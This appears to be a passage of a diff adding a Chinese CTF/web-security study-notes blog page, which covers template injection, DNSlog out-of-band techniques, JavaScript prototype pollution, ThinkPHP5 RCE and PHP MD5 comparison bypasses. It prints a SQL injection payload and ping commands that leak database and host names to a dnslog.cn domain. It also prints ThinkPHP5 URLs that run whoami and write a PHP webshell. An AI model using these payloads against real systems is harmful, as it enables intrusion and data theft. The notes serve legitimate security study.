+<h3 id="常见框架"><a href="#常见框架" class="headerlink" title="常见框架"></a>常见框架</h3><p>不同的框架会对应不同的敏感信息，获取的语法可能也会有不同，需要参考官方文档或者已有的相关wp</p>
+<ol>
+<li>Tornado</li>
+<li>Flask&#x2F;Jinjia2</li>
+</ol>
+<h3 id="题型收集-4"><a href="#题型收集-4" class="headerlink" title="题型收集"></a>题型收集</h3><ol>
+<li>攻防世界-easytornado(from 护网杯)</li>
+<li>攻防世界-easy_web</li>
+</ol>
+<h2 id="DNSlog"><a href="#DNSlog" class="headerlink" title="DNSlog"></a>DNSlog</h2><p>原理：攻击者注入恶意DNS请求，再输入字段中插入payload，服务器发起DNS请求时攻击者可以通过监视DNS服务器的响应来收集信息。</p>
+<p>危害：信息泄露、与其他漏洞结合使用完成无回显渗透</p>
+<ul>
+<li><p>无回显的SQL注入：load_file结合UNC路径（仅适用于Windows），加载远程文件时发起DNS查询</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：and (select load_file(concat(&#x27;//&#x27;,(select database()),&#x27;.6.eudspa.dnslog.cn/a&#x27;)))</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>无回显的命令执行（注意操作系统不同，需要不同的变量表示以及字符串连接）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ping %os%.6.eudspa.dnslog.cn</span><br><span class="line">ping `hostname`.6.eudspa.dnslog.cn</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>无回显的SSRF</p>
+</li>
+</ul>
+<h2 id="Javascript原型链污染"><a href="#Javascript原型链污染" class="headerlink" title="Javascript原型链污染"></a>Javascript原型链污染</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/a3320315/article/details/102883325">JavaScript Prototype污染攻击（CTF 例题分析）-CSDN博客</a></p>
+<p>JSON.parse不能直接导致原型链污染，需要深拷贝。（递归赋值</p>
+<h2 id="Redis未授权"><a href="#Redis未授权" class="headerlink" title="Redis未授权"></a>Redis未授权</h2><h2 id="thinkphp5"><a href="#thinkphp5" class="headerlink" title="thinkphp5"></a>thinkphp5</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44862511/article/details/132132998">thinkphp 5-rce版本漏洞复现(超详细版)_thinkphp5漏洞扫描_徐长卿学网安的博客-CSDN博客</a></p>
+<p>与框架路由有关？</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">index.php?s=index/think\app/invokefunction&amp;<span class="function"><span class="keyword">function</span>=<span class="title">call_user_func_array</span>&amp;<span class="title">vars</span>[0]=<span class="title">system</span>&amp;<span class="title">vars</span>[1][]=<span class="title">whoami</span> //远程命令执行</span></span><br><span class="line"><span class="function"><span class="title">index</span>.<span class="title">php</span>?<span class="title">s</span>=/<span class="title">index</span>/\<span class="title">think</span>\<span class="title">app</span>/<span class="title">invokefunction</span>&amp;<span class="title">function</span>=<span class="title">call_user_func_array</span>&amp;<span class="title">vars</span>[0]=<span class="title">file_put_contents</span>&amp;<span class="title">vars</span>[1][]=<span class="title">shell</span>.<span class="title">php</span>&amp;<span class="title">vars</span>[1][]=&lt;?<span class="title">php</span> <span class="title">phpinfo</span>(<span class="params"></span>)</span>; <span class="meta">?&gt;</span> <span class="comment">//写入webshell</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="MD5加密漏洞"><a href="#MD5加密漏洞" class="headerlink" title="MD5加密漏洞"></a>MD5加密漏洞</h2><h3 id="0e绕过"><a href="#0e绕过" class="headerlink" title="0e绕过"></a>0e绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">md5</span>(<span class="string">&#x27;QNKCDZO&#x27;</span>) == <span class="title function_ invoke__">md5</span>(<span class="number">240610708</span>) <span class="comment">//弱类型比较</span></span><br><span class="line"><span class="number">0e830400451993494058024219903391</span> == <span class="number">0e462097431906509019562988736854</span> <span class="comment">//0e开头的字符串在参与比较时,会被当做科学计数法,结果转换为0</span></span><br><span class="line"><span class="number">0</span> == <span class="number">0</span>	<span class="comment">//返回true</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="数组绕过"><a href="#数组绕过" class="headerlink" title="数组绕过"></a>数组绕过</h3><p>md5不能加密数组,传入数组会报错,但会继续执行并且返回结果为null。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">md5</span>(a[]=<span class="number">1</span>) === <span class="title function_ invoke__">md5</span>(b[]=<span class="number">1</span>)	<span class="comment">//强类型比较</span></span><br><span class="line"><span class="literal">null</span> === <span class="literal">null</span>    </span><br></pre></td></tr></table></figure>
+
+<p>MD5碰撞</p>
+<h2 id="CRLF"><a href="#CRLF" class="headerlink" title="CRLF"></a>CRLF</h2><p>http header注入</p>
+<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="HTTPS中间人攻击"><a href="#HTTPS中间人攻击" class="headerlink" title="HTTPS中间人攻击"></a>HTTPS中间人攻击</h3><p>ARP中间人+中间人伪造证书</p>
+<p>HTST</p>
+<h2 id="New"><a href="#New" class="headerlink" title="New"></a>New</h2><h3 id="log4j2"><a href="#log4j2" class="headerlink" title="log4j2"></a>log4j2</h3><p>日志模块，格式化输出时会产生命令执行</p>
+<p>相关知识点：java, jndi:rmi</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/06/07/tools/vmware%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%8D%A1%E9%A1%BF%E8%A7%A3%E5%86%B3%E6%B1%87%E6%80%BB/" rel="prev" title="vmware虚拟机卡顿解决汇总">
+      <i class="fa fa-chevron-left"></i> vmware虚拟机卡顿解决汇总
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2023/09/17/24%E5%B1%8A%E7%A7%8B%E6%8B%9B/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%80%BB%E7%BB%93/" rel="next" title="渗透测试总结">
+      渗透测试总结 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="nav-number">1.</span> <span class="nav-text">SQL注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B"><span class="nav-number">1.1.</span> <span class="nav-text">注入类型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E6%AD%A5%E9%AA%A4"><span class="nav-number">1.2.</span> <span class="nav-text">注入步骤</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0-%E5%8F%82%E6%95%B0-%E6%96%87%E4%BB%B6"><span class="nav-number">1.2.1.</span> <span class="nav-text">常用函数&#x2F;参数&#x2F;文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8payload"><span class="nav-number">1.2.2.</span> <span class="nav-text">常用payload</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sqlite3"><span class="nav-number">1.3.</span> <span class="nav-text">sqlite3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#graphql"><span class="nav-number">1.4.</span> <span class="nav-text">graphql</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF"><span class="nav-number">1.5.</span> <span class="nav-text">绕过姿势</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E5%9E%8B%E6%94%B6%E9%9B%86"><span class="nav-number">1.6.</span> <span class="nav-text">题型收集</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS"><span class="nav-number">2.</span> <span class="nav-text">XSS</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#XSS%E7%B1%BB%E5%9E%8B"><span class="nav-number">2.1.</span> <span class="nav-text">XSS类型</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CSRF"><span class="nav-number">3.</span> <span class="nav-text">CSRF</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSFR"><span class="nav-number">4.</span> <span class="nav-text">SSFR</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0"><span class="nav-number">4.1.</span> <span class="nav-text">相关函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="nav-number">4.2.</span> <span class="nav-text">常用伪协议</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF-1"><span class="nav-number">4.3.</span> <span class="nav-text">绕过姿势</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E5%9E%8B%E6%94%B6%E9%9B%86-1"><span class="nav-number">4.4.</span> <span class="nav-text">题型收集</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="nav-number">5.</span> <span class="nav-text">文件上传</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF-2"><span class="nav-number">5.1.</span> <span class="nav-text">绕过姿势</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="nav-number">5.2.</span> <span class="nav-text">解析漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-number">5.3.</span> <span class="nav-text">文件包含</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0-1"><span class="nav-number">5.3.1.</span> <span class="nav-text">相关函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%AF%BB%E5%8F%96%E5%8D%8F%E8%AE%AE"><span class="nav-number">5.3.2.</span> <span class="nav-text">读取协议</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E5%9E%8B%E6%94%B6%E9%9B%86-2"><span class="nav-number">5.4.</span> <span class="nav-text">题型收集</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">6.</span> <span class="nav-text">反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0-2"><span class="nav-number">6.1.</span> <span class="nav-text">相关函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">6.2.</span> <span class="nav-text">shiro反序列化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">6.3.</span> <span class="nav-text">session反序列化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8"><span class="nav-number">6.4.</span> <span class="nav-text">字符逃逸</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E5%9E%8B%E6%94%B6%E9%9B%86-3"><span class="nav-number">6.5.</span> <span class="nav-text">题型收集</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RCE"><span class="nav-number">7.</span> <span class="nav-text">RCE</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#php%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0"><span class="nav-number">7.1.</span> <span class="nav-text">php相关函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF-3"><span class="nav-number">7.2.</span> <span class="nav-text">绕过姿势</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5"><span class="nav-number">8.</span> <span class="nav-text">模板注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8payload-1"><span class="nav-number">8.1.</span> <span class="nav-text">常用payload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E6%A1%86%E6%9E%B6"><span class="nav-number">8.2.</span> <span class="nav-text">常见框架</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E5%9E%8B%E6%94%B6%E9%9B%86-4"><span class="nav-number">8.3.</span> <span class="nav-text">题型收集</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DNSlog"><span class="nav-number">9.</span> <span class="nav-text">DNSlog</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Javascript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="nav-number">10.</span> <span class="nav-text">Javascript原型链污染</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Redis%E6%9C%AA%E6%8E%88%E6%9D%83"><span class="nav-number">11.</span> <span class="nav-text">Redis未授权</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#thinkphp5"><span class="nav-number">12.</span> <span class="nav-text">thinkphp5</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MD5%E5%8A%A0%E5%AF%86%E6%BC%8F%E6%B4%9E"><span class="nav-number">13.</span> <span class="nav-text">MD5加密漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0e%E7%BB%95%E8%BF%87"><span class="nav-number">13.1.</span> <span class="nav-text">0e绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87"><span class="nav-number">13.2.</span> <span class="nav-text">数组绕过</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CRLF"><span class="nav-number">14.</span> <span class="nav-text">CRLF</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%B6%E4%BB%96"><span class="nav-number">15.</span> <span class="nav-text">其他</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#HTTPS%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB"><span class="nav-number">15.1.</span> <span class="nav-text">HTTPS中间人攻击</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#New"><span class="nav-number">16.</span> <span class="nav-text">New</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#log4j2"><span class="nav-number">16.1.</span> <span class="nav-text">log4j2</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Sean"
+      src="/images/banner.jpg">
+  <p class="site-author-name" itemprop="name">Sean</p>
+  <div class="site-description" itemprop="description">热爱可抵岁月漫长</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">90</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">25</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">17</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Seanxz401" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Seanxz401" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Sean</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
